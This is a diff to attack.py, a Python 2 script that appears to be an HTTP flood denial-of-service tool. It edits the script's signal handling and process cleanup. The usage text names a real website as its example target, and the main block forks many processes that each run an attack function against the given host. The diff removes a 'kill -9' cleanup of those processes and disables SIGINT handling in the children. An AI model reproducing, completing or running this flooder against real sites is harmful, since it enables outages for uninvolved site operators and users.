@@ -14,9 +14,6 @@ import random
 import urllib2
 import threading
 
-script_name = ""
-p_pid = 0
-
 def usage():
 	print ''' usage : python attack.py [-t] [-c] http://www.baidu.com/
 	-h : help
@@ -51,15 +48,9 @@ def referer_list():
 	return(headers_referers)
 
 def handler(signum,_):
-	global script_name
-	global p_pid
 	if signum == signal.SIGALRM:
 		print "Time is up !"
 		print "Attack finished !"
-	if signum == signal.SIGINT:
-		print "Attack has been interruptted"
-	stop_cmd = "kill -9 `ps axu | grep %s | grep -v %d | awk '{print $2}'`>/dev/null 2>&1" %(script_name,p_pid)
-	os.popen(stop_cmd)
 	sys.exit()
 
 #builds random ascii string
@@ -125,7 +116,6 @@ if __name__ == '__main__':
 	if len(sys.argv) < 2:
 		usage()
 		sys.exit()
-	script_name = sys.argv[0]
 	parse_parameters(sys.argv[1:])
 	print "Debug : thread=%d time=%d %s"%(int(num_thread),int(interval),url)
 	if url.count('/') == 2:
@@ -148,11 +138,11 @@ if __name__ == '__main__':
 	signal.signal(signal.SIGINT, handler)
 	signal.signal(signal.SIGALRM, handler)
 	signal.alarm(int(interval))
-	p_pid = os.getpid()
+
 	for i in range(int(num_thread)):
 		newpid = os.fork()
 		if newpid == 0:
-			signal.signal(signal.SIGINT, signal.SIG_DFL)
+#			signal.signal(signal.SIGINT, signal.SIG_DFL)
 			attack(host,param_joiner)
 		else:
 			pass 
